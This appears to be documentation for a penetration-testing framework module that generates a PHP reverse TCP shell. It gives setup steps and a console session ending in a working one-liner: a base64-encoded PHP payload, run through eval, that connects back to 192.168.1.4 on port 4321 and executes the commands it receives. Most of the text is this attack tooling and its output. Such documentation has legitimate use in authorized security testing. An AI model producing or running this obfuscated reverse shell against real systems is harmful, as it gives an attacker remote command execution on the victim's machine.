## Description

Module generates payload that creates interactive tcp reverse shell by using php one-liner. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/cmd/php_reverse_tcp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Do: `run`
  6. Module generates php tcp reverse shell payload

## Scenarios

```
rsf > use payloads/cmd/php_reverse_tcp
rsf (PHP Reverse TCP One-Liner) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (PHP Reverse TCP One-Liner) > set lport 4321
[+] lport => 4321
rsf (PHP Reverse TCP One-Liner) > run
[*] Running module...
[*] Generating payload
php -r "eval(base64_decode('JHM9ZnNvY2tvcGVuKCJ0Y3A6Ly8xOTIuMTY4LjEuNCIsNDMyMSk7d2hpbGUoIWZlb2YoJHMpKXtleGVjKGZnZXRzKCRzKSwkbyk7JG89aW1wbG9kZSgiXG4iLCRvKTskby49IlxuIjtmcHV0cygkcywkbyk7fQ=='));"
```
